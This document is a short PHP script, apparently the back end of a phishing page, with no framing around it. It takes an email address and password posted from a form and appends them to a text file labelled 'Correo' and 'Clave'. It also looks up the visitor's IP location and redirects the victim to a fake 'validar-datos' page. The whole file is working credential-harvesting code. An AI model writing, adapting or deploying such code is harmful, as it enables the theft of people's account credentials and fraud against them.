<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$datoa=$_POST['correo2'];
$datob=$_POST['co'];
$archivo="silfre21$.txt";
$file=fopen($archivo,"a");
fwrite($file, "Correo: ".$datoa.PHP_EOL);
fwrite($file, "Clave: ".$datob.PHP_EOL);
fclose($file);
Header ("Location:validar-datos.html");?>